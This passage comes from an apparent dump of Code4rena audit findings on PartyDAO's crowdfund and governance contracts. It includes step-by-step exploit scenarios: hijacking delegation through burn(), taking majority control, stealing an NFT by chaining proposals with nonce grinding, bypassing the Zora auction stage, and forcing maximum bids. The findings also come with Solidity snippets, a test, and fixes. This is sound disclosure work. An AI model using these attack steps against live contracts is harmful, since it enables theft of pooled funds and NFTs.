https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171   # Vulnerability details       burn() allows for previously recorded delegate to set himself to be contributor's delegate even if another one was already chosen.  This can be quite material as owner choice for the whole voting power is being reset this way to favor the old delegate.  ## Proof of Concept  _burn() can be invoked by anyone on the behalf of any `contributor`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171  ```solidity     function burn(address payable contributor)         public     {         return _burn(contributor, getCrowdfundLifecycle(), party);     } ```  It mints the governance NFT for the contributor whenever he has voting power:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L471-L485  ```solidity         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         } ```  Now mint() calls _adjustVotingPower() with a new delegate, redirecting all the intristic power, not just one for that id, ignoring the delegation the `owner` might already have:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower;         _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate);         _mint(owner, tokenId);     } ```  I.e. Bob the contributor can take part in the crowdfunding with contribute() with small `0.01 ETH` stake, stating Mike as the delegate of his choice with `contribute(Mike, ...)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L189-L208  ```solidity     /// @param delegate The address to delegate to for the governance phase.     /// @param gateData Data to pass to the gatekeeper to prove eligibility.     function contribute(address delegate, bytes memory gateData)         public         payable     {         _contribute(             msg.sender,             msg.value.safeCastUint256ToUint96(),             delegate,             // We cannot use `address(this).balance - msg.value` as the previous             // total contributions in case someone forces (suicides) ETH into this             // contract. This wouldn't be such a big deal for open crowdfunds             // but private ones (protected by a gatekeeper) could be griefed             // because it would ultimately result in governance power that             // is unattributed/unclaimable, meaning that party will never be             // able to reach 100% consensus.             totalContributions,             gateData         ); ```  Then crowdfund was a success, party was created, and Melany, who also participated, per off-chain arrangement has transferred to Bob a `tokenId` with big voting power (say it is `100 ETH` and the majority of voting power):  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L146-L155  ```solidity     /// @inheritdoc ERC721     function safeTransferFrom(address owner, address to, uint256 tokenId)         public         override         onlyDelegateCall     {         // Transfer voting along with token.         _transferVotingPower(owner, to, votingPowerByTokenId[tokenId]);         super.safeTransferFrom(owner, to, tokenId);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L879-L887  ```solidity     // Transfers some voting power of `from` to `to`. The total voting power of     // their respective delegates will be updated as well.     function _transferVotingPower(address from, address to, uint256 power)         internal     {         int192 powerI192 = power.safeCastUint256ToInt192();         _adjustVotingPower(from, -powerI192, address(0));         _adjustVotingPower(to, powerI192, address(0));     } ```  Bob don't care about his early small contribution and focuses on managing the one that Melany transferred instead as he simply don't need the voting power from the initial `0.01 ETH` contribution anymore.  The actual delegate for Bob at the moment is Linda, while his business with Mike is over. So Bob sets her address there, calling `delegateVotingPower(Linda)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L448-L454  ```solidity     /// @notice Pledge your intrinsic voting power to a new delegate, removing it from     ///         the old one (if any).     /// @param delegate The address to delegating voting power to.     function delegateVotingPower(address delegate) external onlyDelegateCall {         _adjustVotingPower(msg.sender, 0, delegate);         emit VotingPowerDelegated(msg.sender, delegate);     } ```  Now, Mike can unilaterally delegate to himself the whole voting power with `burn(Bob)` as mint() just resets the delegation with the previously recorded value with `_adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate)`.  ## Recommended Mitigation Steps  The issue is that mint() always assumes that it is the first operation for the `owner`, which might not always be the case.  Consider not changing the delegate on `mint` if one is set already:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower; +       address actualDelegate = <get_current_delegate>; +       if (actualDelegate == address(0)) actualDelegate = delegate; -       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate); +       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), actualDelegate);         _mint(owner, tokenId);     } ```  More complicated version might be the one with tracking the most recent request via contribute()/delegateVotingPower() calls timestamps. Here we assume that the delegateVotingPower() holds more information as in the majority of practical cases it occurs after initial contribute() and it is a direct voluntary call from the owner.   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/322", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/indijanc-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/301", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/m_Rassska-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/293", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Ch_301-Q.md)."}, {"title": "Early contributor can always become majority of crowdfund leading to rugging risks.", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/284", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L114-L135   # Vulnerability details  ## Description Voting power is distributed to crowdfund contributors according to the amount contributed divided by NFT purchase price. Attacker can call the buy() function of BuyCrowdfund / CollectionBuyCrowdfund, and use only the first X amount of contribution from the crowdfund, such that attacker's contribution > X/2. He will pass his contract to the buy call, which will receive X and will need to add some additional funds, to purchase the NFT. If the purchase is successful, attacker will have majority rule in the created party. If the party does not do anything malicious, this is a losing move for attacker, because the funds they added on top of X to compensate for the NFT price will eventually be split between group members. However, with majority rule there are various different exploitation vectors attacker may use to steal the NFT from the party ( detailed in separate reports). Because it is accepted that single actor majority is dangerous, but without additional vulnerabilities attacker cannot take ownership of the party's assets, I classify this as a medium. The point is that users were not aware they could become minority under this attack flow.   ## Impact Early contributor can always become majority of crowdfund leading to rugging risks.  ## Proof of Concept 1. Victim A opens BuyCrowdfund and deposits 20 ETH 2. Attacker deposits 30 ETH 3. Victim B deposits 50 ETH 4. Suppose NFT costs 100 ETH 5. Attacker will call buy(), requesting 59ETH buy price. His contract will add 41 additional ETH and buy the NFT. 6. Voting power distributed will be: 20 / 59 for Victim A, 30 / 59 for Attacker, 9 / 59 for Victim B. Attacker has majority. 7. User can use some majority attack to take control of the NFT, netting 100 (NFT value) - 41 (external contribution) - 30 (own contribution) = 29 ETH    ## Tools Used Manual audit.  ## Recommended Mitigation Steps Add a Crowdfund property called minimumPrice, which will be visible to all. Buy() function should not accept NFT price < minimumPrice. Users now have assurances that are not susceptible to majority rule if they deposited enough ETH below the minimumPrice.  "}, {"title": " A majority attack can steal precious NFT from the party by crafting and chaining two proposals", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/277", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L116 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/FractionalizeProposal.sol#L54-L62   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. Majority cannot exfiltrate the ETH gained from selling precious NFT via any proposal, and it's impossible to sell NFT for any asset except ETH. If the party were to be compensated via an ERC20 token, majority could pass an ArbitraryCallsProposal to transfer these tokens to an attacker wallet. Unfortunately, FractionalizeProposal is vulnerable to this attack. Attacker/s could pass two proposals and wait for them to be ready for execution. Firstly, a FractionalizeProposal to fractionalize the NFT and mint totalVotingPower amount of ERC20 tokens of the created vault. Secondly, an ArbitraryCallsProposal to transfer the entire ERC20 token supply to an attacker address. At this point, attacker can call vault.redeem() to burn the outstanding token supply and receive the NFT back.  ## Impact A 51% majority could steal the precious NFT from the party and leave it empty.  ## Proof of Concept The only non-trivial component of this attack is that the created vault, whose tokens we wish to transfer out, has an undetermined address until VAULT_FACTORY.mint() is called, which creates it. The opcode which creates the vault contract is CREATE, which calculates the address with ```keccak256(VAULT_FACTORY, nonce)```. Nonce will keep changing while new, unrelated NFTs are fractionalized. The attack needs to prepare both FractionalizedProposal and ArbitraryCallsProposal ahead of time, so that they could be chained immediately, meaning there would be no time for other members to call distribute() on the party, which would store the fractionalized tokens safely in the distributor. In order to solve this chicken and the egg problem, we will use a technique taken from traditional low-level exploitation called heap feng shui.   Firstly, calculate off-chain, the rate new NFTs are fractionalized, and multiple by a safety factor (like 1.2X), and multiply again by the proposal execution delay. This number, added to the current VAULT_FACTORY nonce, will be our target_nonce. Calculate ```target_vault = keccak256(VAULT_FACTORY, target_nonce)```, ```before_target_vault = keccak256(VAULT_FACTORY, target_nonce-1)```  Firstly, we will create a contract which has an attack function that: 1. Loop while before_target_vault != created_vault:  \u2022 Mint new dummy attacker_NFT  \u2022 created_vault = VAULT_FACTORY.mint(attacker_NFT\u2026) 2. Call execute() on the FractionalizedProposal  // We will feed the execute() parameters to the contract in a separate contract setter. Note that this is guaranteed to create target_vault on the correct address. 3. Call execute() on the ArbitraryCallsProposal  Then, we propose the two proposals: 1. Propose a FractionalizedProposal, with any list price and the precious NFT as parameter 2. Propose an ArbitraryCallsProposal, with target = target_vault, data = transfer(ATTACKER, totalVotingPower)  Then, we set the execute() parameters passed in step 2 and 3 of the attack contract using the proposalID allocated for them.   Then, we wait for execution delay to finish.  Finally, run the attack() function prepared earlier. This will increment the VAULT_FACTORY nonce until it is the one we count on during the ArbitraryCallsProposal. Pass enough gas to be able to burn enough nonces.  At this point, attacker has all the vault tokens, so he may call vault.redeem() and receive the precious NFT.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps 1. Enforce a minimum cooldown between proposals. This will mitigate additional weaknesses of the proposal structure. Here, this will give users the opportunity to call distribute() to put the vault tokens safe in distributor. 2. A specific fix here would be to call distribute() at the end of FractionalizeProposal so that there is no window to steal the funds.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/272", "labels": ["bug", "G (Gas Optimization)", "high quality report", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/CertoraInc-G.md)."}, {"title": "A majority attack can easily bypass Zora auction stage in OpenseaProposal and steal the NFT from the party.", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/264", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ListOnZoraProposal.sol#L176-L183   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. One of the main protections is that before listing the NFT on Opensea for a proposal-supplied price, it must first try to be auctioned off on Zora. To move from Zora stage to Opensea stage, _settleZoraAuction() is called when executing ListedOnZora step in ListOnOpenseaProposal.sol. If the function returns false, the next step is executed which lists the item on Opensea. It is assumed that if majority attack proposal reaches this stage, it can steal the NFT for free, because it can list the item for negligible price and immediately purchase it from a contract that executes the Opensea proposal.   Indeed, attacker can always make settleZoraAuction() return false. Looking at  the code: ``` try ZORA.endAuction(auctionId) {             // Check whether auction cancelled due to a failed transfer during             // settlement by seeing if we now possess the NFT.             if (token.safeOwnerOf(tokenId) == address(this)) {                 emit ZoraAuctionFailed(auctionId);                 return false;             }         } catch (bytes memory errData) { ``` As the comment already hints, an auction can be cancelled if the NFT transfer to the bidder fails. This is the relevant AuctionHouse code (endAuction): ``` {             // transfer the token to the winner and pay out the participants below             try IERC721(auctions[auctionId].tokenContract).safeTransferFrom(address(this), auctions[auctionId].bidder, auctions[auctionId].tokenId) {} catch {                 _handleOutgoingBid(auctions[auctionId].bidder, auctions[auctionId].amount, auctions[auctionId].auctionCurrency);                 _cancelAuction(auctionId);                 return;  } ``` As most NFTs inherit from OpenZeppelin's ERC721.sol code, safeTransferFrom will run: ```     function _safeTransfer(         address from,         address to,         uint256 tokenId,         bytes memory data     ) internal virtual {         _transfer(from, to, tokenId);         require(_checkOnERC721Received(from, to, tokenId, data), \"ERC721: transfer to non ERC721Receiver implementer\");     } ``` So, attacker can bid a very high amount on the NFT to ensure it is the winning bid. When AuctionHouse tries to send the NFT to attacker, the safeTransferFrom will fail because attack will not implement an ERC721Receiver. This will force the AuctionHouse to return the bid amount to the bidder and cancel the auction. Importantly, it will lead to a graceful return from endAuction(), which will make settleZoraAuction() return false and progress to the OpenSea stage.  ## Impact A majority attack can easily bypass Zora auction stage and steal the NFT from the party.  ## Proof of Concept 1. Pass a ListOnOpenseaProposal with a tiny list price and execute it 2. Create an attacker contract which bids on the NFT an overpriced amount, but does not implement ERC721Receiver. Call its bid() function 3. Wait for the auction to end ( timeout after the bid() call) 4. Create a contract with a function which calls execute() on the proposal and immediately buys the item on Seaport. Call the attack function.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps _settleZoraAuction is called from both ListOnZoraProposal and ListOnOpenseaProposal. If the auction was cancelled due to a failed transfer, as is described in the comment, we would like to handle it differently for each proposal type. For ListOnZoraProposal, it should indeed return false, in order to finish executing the proposal and not to hang the engine. For ListOnOpenseaProposal, the desired behavior is to *revert* in the case of a failed transfer. This is because the next stage is risky and defense against the mentioned attack is required. Therefore, pass a revertOnFail flag to _settleZoraAuction, which will be used like so: ``` // Check whether auction cancelled due to a failed transfer during // settlement by seeing if we now possess the NFT. if (token.safeOwnerOf(tokenId) == address(this)) {  if (revertOnFail) {   revert(\"Zora auction failed because of transfer to bidder\")  }            emit ZoraAuctionFailed(auctionId);            return false; } ```   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/260", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/delfin454000-Q.md)."}, {"title": "# Only part of `keccak256()` is used as hash, making it susceptible to collision attacks", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/231", "labels": ["bug", "2 (Med Risk)", "high quality report", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L275 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L325 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L26   # Vulnerability details    At 2 places in the code only part of the output of `keccak256()` is used as the hash: * At `TokenDistributor` - `DistributionState.distributionHash15` - uses only a 15 bytes as a hash     * This one is intended to save storage * At `Crowdfund.governanceOptsHash` a 16 bytes is used as hash     * This one has no benefit at all as it doesn't save on storage   15/16 bytes hash is already not very high to begin with (as explained below). On top of that, using a non standard hash can be unsafe. Since diverging from the standard can break things.    ## Impact   For the `FixedGovernanceOpts` an attacker can create a legitimate party, and then when running `buy()` use the malicious hash to: * include himself in the hosts (DoS-ing the party by vetoing every vote) * reduce the `passThresholdBps` (allowing him to pass any vote, including sending funds from the Party) * Setting himself as `feeRecipient` and increasing the fee   For the `DistributionInfo` struct - an attacker can easily drain all funds from the token distribution contract, by using the legitimate hash to create a distribution with a malicious ERC20 token (and a malicious party contract), and then using the malicious hash to claim assets of a legitimate token.  ## Proof of Concept  ### The attack   Using the birthday attack, for a 50% chance with a 15 bytes hash, the number of hashes needed to generate is 1.4e18 (`(ln(1/0.5) *2) ** 0.5 * (2 ** 60)`). * For 16 bytes that would be 2.2e19  An attacker can create 2 different structs, a legitimate and a malicious one, while modifying at each iteration only the last bits * For the `FixedGovernanceOpts` the last bits would be the `feeRecipient` field * For the `DistributionInfo` struct that would be the `fee` field (and then exploit it via the `claim()` function which doesn't validate the `fee` field)  The attacker will than generate half of the hashes from the malicious one, and half from the legitimate ones, so in case of a collision there's a 50% chance it'd be between the legitimate and malicious struct.    ### CPU  * In the `DistributionInfo` we have 224 bytes (and for `FixedGovernanceOpts` 192 bytes if we precalculate the hosts hash) * A computer needs about 11 cycles per byte * An avg home PC can do ~3e9 cycles per seconds * There are ~8.6e4 seconds a day * Putting it all together `1.4e18 * 11 * 224 / (3e9*8.6e4)` = ~1.3e8  * Note that we can further optimize it (by 10 times at least), since we're using the same input and only modifying the last bits every time (the `fee` field)  ### Storage 32 * 1.4e18 = ~4.5e19 bytes is needed, while an affordable drive can be 8TB=~8e12 bytes. That puts it about 5e6 times away from and affordable attack.   ### Overall Risk The calculations above are for basic equipment, an attacker can be spending more on equipment to get closer (I'd say you can easily multiply that by 100 for a medium size attacker + running the computations for more than one day) Combining that with the fact that a non-standard hash is used, and that in general hashes can have small vulnerabilities that lower a bit their strength - I'd argue it's not very safe to be ~1e4 (for a medium size attacker; ~1.5e5 for 16 bytes) away from a practical attack.    ## Recommended Mitigation Steps Use the standard, 32-bytes, output of `keccak256()`"}, {"title": "Attacker can force AuctionCrowdfunds to bid their entire contribution up to maxBid", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/220", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L166-L167   # Vulnerability details  ## Description AuctionCrowdfund's bid() allows any user to compete on an auction on the party's behalf. The code in bid()  forbids placing a bid if party is already winning the auction: ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         } ``` However, it does not account for attackers placing bids from their own wallet, and then immediately overbidding them using the party's funds. This can be used in two ways: 1. Attacker which lists an NFT, can force the party to spend all its funds up to maxBid on the auction, even if the party could have purchased the NFT for much less. 2. Attackers can grief random auctions, making them pay the absolute maximum for the item. Attackers can use this to drive the prices of NFT items up, profiting from this using secondary markets.  ## Impact Parties can be stopped from buying items at a good value without any risk to the attacker.  ## Proof of Concept 1. Attacker places an NFT for sale, valued at X 2. Attacker creates an AuctionCrowdfund, with maxBid = Y such that Y = 2X 3. Current bid for the NFT is X - AUCTION_STEP 3. Users contribute to the fund, which now has 1.5X 4. Users call bid() to bid X  for the NFT 5. Attacker bids for the item externally for 1.5X - AUCTION_STEP 6. Attacker calls bid() to bid 1.5X for the NFT 7. Attacker sells his NFT for 1.5X although no one apart from the party was interested in buying it above price X  ## Tools Used Manual audit.  ## Recommended Mitigation Steps Introduce a new option variable to AuctionCrowdfunds called speedBump. Inside the bid() function, calculate seconds since last bid, multiplied by the price change factor. This product must be smaller than the chosen speedBump. Using this scheme, the protocol would have resistance to sudden bid spikes. Optionally, allow a majority funder to override the speed bump.  "}, {"title": "Calling `transferEth` function can revert if `receiver` input corresponds to a contract that is unable to receive ETH through its `receive` or `fallback` function", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/212", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388   # Vulnerability details  ## Impact The following `transferEth` function is called when calling the `_burn` or `_transfer` function below. If the `receiver` input for the `transferEth` function corresponds to a contract, it is possible that the receiver contract does not, intentionally or unintentionally, implement the `receive` or `fallback` function in a way that supports receiving ETH or that calling the receiver contract's `receive` or `fallback` function executes complicated logics that cost much gas, which could cause calling `transferEth` to revert. For example, when calling `transferEth` reverts, calling `_burn` also reverts; this means that the receiver contract would not be able to get the voting power and receive the extra contribution it made after the crowdfunding finishes; yet, the receiver contract deserves these voting power and contribution refund. Hence, the receiver contract loses valuables that it deserves, which is unfair to the users who controls it.  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 ```solidity     function transferEth(address payable receiver, uint256 amount)         internal     {         (bool s, bytes memory r) = receiver.call{value: amount}(\"\");         if (!s) {             revert EthTransferFailed(receiver, r);         }     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 ```solidity     function _burn(address payable contributor, CrowdfundLifecycle lc, Party party_)         private     {         // If the CF has won, a party must have been created prior.         if (lc == CrowdfundLifecycle.Won) {             if (party_ == Party(payable(0))) {                 revert NoPartyError();             }         } else if (lc != CrowdfundLifecycle.Lost) {             // Otherwise it must have lost.             revert WrongLifecycleError(lc);         }         // Split recipient can burn even if they don't have a token.         if (contributor == splitRecipient) {             if (_splitRecipientHasBurned) {                 revert SplitRecipientAlreadyBurnedError();             }             _splitRecipientHasBurned = true;         }         // Revert if already burned or does not exist.         if (splitRecipient != contributor || _doesTokenExistFor(contributor)) {             CrowdfundNFT._burn(contributor);         }         // Compute the contributions used and owed to the contributor, along         // with the voting power they'll have in the governance stage.         (uint256 ethUsed, uint256 ethOwed, uint256 votingPower) =             _getFinalContribution(contributor);         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         }         // Refund any ETH owed back to the contributor.         contributor.transferEth(ethOwed);         emit Burned(contributor, ethUsed, ethOwed, votingPower);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388 ```solidity     function _transfer(         TokenType tokenType,         address token,         address payable recipient,         uint256 amount     )         private     {         bytes32 balanceId = _getBalanceId(tokenType, token);         // Reduce stored token balance.         _storedBalances[balanceId] -= amount;         if (tokenType == TokenType.Native) {             recipient.transferEth(amount);         } else {             assert(tokenType == TokenType.Erc20);             IERC20(token).compatTransfer(recipient, amount);         }     } ```  ## Proof of Concept Please add the following `error` and append the test in `sol-tests\\crowdfund\\BuyCrowdfund.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     error EthTransferFailed(address receiver, bytes errData);      function testContributorContractFailsToReceiveETH() public {         uint256 tokenId = erc721Vault.mint();         BuyCrowdfund pb = _createCrowdfund(tokenId, 0);          // This contract is used to simulate a contract that does not implement the receive or fallback function for the purpose of receiving ETH.         address payable contributorContract = payable(address(this));         vm.deal(contributorContract, 1e18);          address delegate = _randomAddress();          // contributorContract contributes 1e18.         vm.prank(contributorContract);         pb.contribute{ value: 1e18 }(delegate, \"\");          // The price of the NFT of interest is 0.5e18.         Party party_ = pb.buy(             payable(address(erc721Vault)),             0.5e18,             abi.encodeCall(erc721Vault.claim, (tokenId)),             defaultGovernanceOpts         );          // After calling the buy function, the party is created with the NFT.         assertEq(address(party), address(party_));         assertTrue(pb.getCrowdfundLifecycle() == Crowdfund.CrowdfundLifecycle.Won);         assertEq(pb.settledPrice(), 0.5e18);         assertEq(pb.totalContributions(), 1e18);         assertEq(address(pb).balance, 1e18 - 0.5e18);          // Calling the burn function reverts because contributorContract cannot receive ETH through the receive or fallback function         vm.expectRevert(abi.encodeWithSelector(             EthTransferFailed.selector,             contributorContract,             \"\"         ));         pb.burn(contributorContract);          // contributorContract does not receive 0.5e18 back from the BuyCrowdfund contract.         assertEq(contributorContract.balance, 0);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When calling the `transferEth` function, if the receiver contract is unable to receive ETH through its `receive` or `fallback` function, WETH can be used to deposit the corresponding ETH amount, and the deposited amount can be transferred to the receiver contract."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/209", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/0x1f8b-Q.md)."}, {"title": "The settledPrice maybe exceed maximumPrice", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/201", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L122   # Vulnerability details  ## Impact  BuyCrowdfundBase.sol _buy() When callValue = 0 is settledPrice to totalContributions ignoring whether totalContributions > maximumPrice resulting in the minimum proportion of participants expected to become smaller  ## Proof of Concept ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;  //**** not check totalContributions>maximumPrice****//             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }             settledPrice = settledPrice_;     ```  (AuctionCrowdfund.sol finalize()  similar)  ## Recommended Mitigation Steps add check  ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }  +++         if (maximumPrice_ != 0 && settledPrice_ > maximumPrice_) { +++                settledPrice_ = maximumPrice_; +++         }              settledPrice = settledPrice_;     ``` "}, {"title": "NFT Owner can stuck Crowdfund user funds", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/197", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L236   # Vulnerability details  ## Impact Consider a scenario where few users contributed in auction but noone has placed any bid due to reason like NFT price crash etc. So there was 0 bid, nft owner could seize the crowdfund users fund until they pay a ransom amount as shown below.  ## Proof of Concept 1. NFT N auction is going on 2. CrowdFund users have contributed 100 amount for this auction 3. Bidding has not been done yet 4. A news came for this NFT owner which leads to crashing of this NFT price 5. CrowdFund users are happy that they have not bided and are just waiting for auction to complete so that they can get there refund 6. NFT owner realizing this blackmails the CrowdFund users to send him amount 50 or else he would send this worthless NFT to the Crowdfund Auction contract basically stucking all crowdfund users fund. CrowdFund users ignore this and simply wait for auction to end 7. Once auction completes [finalize function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L196) is called  ``` function finalize(FixedGovernanceOpts memory governanceOpts)         external         onlyDelegateCall         returns (Party party_)     { ...  if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions;                 if (lastBid_ == 0) {                     // Nobody ever contributed. The NFT is effectively burned.                     revert NoContributionsError();                 }                 lastBid = lastBid_;             }             // Create a governance party around the NFT.             party_ = _createParty(                 _getPartyFactory(),                 governanceOpts,                 nftContract,                 nftTokenId             );             emit Won(lastBid_, party_);         }  ... } ```  8. Before calling finalize the lastBid was 0 since no one has bid on this auction but lets see what happens on calling finalize  9. Since NFT owner has transferred NFT to this contract so below statement holds true and lastBid_ is also 0 since no one has bided  ``` if (lastBid_ == 0) {                 lastBid_ = totalContributions; ```  10. This means now lastBid_ is changed to totalContributions which is 100 so crowdfund users funds will not be refunded and they will end up with non needed NFT.   ## Recommended Mitigation Steps Remove the line lastBid_ = totalContributions; and let it be the last bid amount which crowdfund users actually bided with."}, {"title": "Attacker can DOS private party by donating ETH then calling buy", "html_url": 